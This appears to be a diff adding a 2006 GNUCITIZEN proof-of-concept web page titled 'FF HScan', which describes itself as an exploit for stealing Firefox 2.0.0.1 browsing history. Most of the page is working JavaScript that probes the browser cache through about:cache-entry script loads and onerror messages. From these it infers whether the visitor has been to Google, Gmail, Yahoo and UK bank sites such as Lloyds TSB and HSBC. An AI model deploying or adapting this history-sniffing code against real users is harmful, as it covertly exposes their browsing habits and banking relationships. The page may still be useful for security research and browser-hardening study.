@@ -1,0 +1,112 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+		<title>FF HScan</title>
+	</head>
+	<body id="presentation">
+
+		<div id="header">
+			<h1>FF HScan</h1>
+			<p>steal firefox history redux</p>
+		</div>
+		
+		<div id="content">
+			<p>The following exploit works on Firefox 2.0.0.1. Other versions might be vulnerable too.</p>
+			<table>
+				<tbody id="results">
+					<tr>
+						<td>URL</td>
+						<td>status</td>
+					</tr>
+				</tbody>
+			</table>
+			<script>
+				var index = 0;
+
+				var sigs = [
+					{url: 'http://www.google.com/', test: 'http://www.google.com/intl/en_uk/images/logo.gif'},
+					{url: 'http://www.google.co.uk/', test: 'http://www.google.co.uk/intl/en_uk/images/logo.gif'},
+					{url: 'http://mail.google.com/', test: 'http://mail.google.com/mail/help/images/googlemail.gif'},
+					{url: 'http://us.i1.yimg.com/', test: 'http://us.i1.yimg.com/us.yimg.com/i/ww/beta/y3.gif'},
+					{url: 'http://www.lloydstsb.com/', test: 'http://www.lloydstsb.com/media/lloydstsb2004/logos/logo_lloydstsb.gif'},
+					{url: 'http://www.hsbc.co.uk/', test: 'http://www.hsbc.co.uk/1/themes/html/hsbcukhome/logo.gif'},
+					{url: 'http://lcamtuf.coredump.cx/', test: 'http://lcamtuf.coredump.cx/photo/current/grecja_2.jpg'},
+				];
+
+				onerror = function (a, b, c) {
+					if (a.match(/^missing/)) {
+						var sig = getSignatureByURL(b);
+						log(sig.url, 'visited');
+					} else {
+						var sig = getSignatureByURL(b);
+						log(sig.url, 'NOT visited');
+					}
+
+					return true;
+				};
+
+				var tmr = setInterval(function () {
+					if (index == sigs.length) {
+						clearInterval(tmr);
+						return;
+					}
+
+					var s = document.createElement('script');
+					s.defer = true;
+					s.type = 'text/javascript';
+					s.src = 'about:cache-entry?client=image&sb=0&key=' + sigs[index++].test;
+
+					document.body.appendChild(s);
+				}, 250);
+
+				function log(url, message) {
+					var tr = document.createElement('tr');
+
+					var td1 = document.createElement('td');
+					td1.innerHTML = url;
+
+					var td2 = document.createElement('td');
+					td2.innerHTML = '<strong>' + message + '</strong>';
+
+					tr.appendChild(td1);
+					tr.appendChild(td2);
+
+					document.getElementById('results').appendChild(tr);
+				}
+
+				function getSignatureByURL(url) {
+					for (var i = 0; i < sigs.length; i++)
+						if (url.match(sigs[i].test))
+							return sigs[i];
+				}
+			</script>
+		</div>
+		
+		<div id="footer">
+			<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/">CC</a>)2006 <a href="http://www.gnucitizen.org">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">	
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/" />
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2006</dc:date>
+				<dc:creator><Agent><dc:title>Petko D. Petkov</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>Petko D. Petkov</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text" />
+				<dc:source rdf:resource="http://www.gnucitizen.org" />
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<script src="http://www.google-analytics.com/urchin.js" type="text/javascript"></script>
+		<script type="text/javascript">_uacct = "UA-363996-1"; urchinTracker();</script>
+	</body>
+</html>
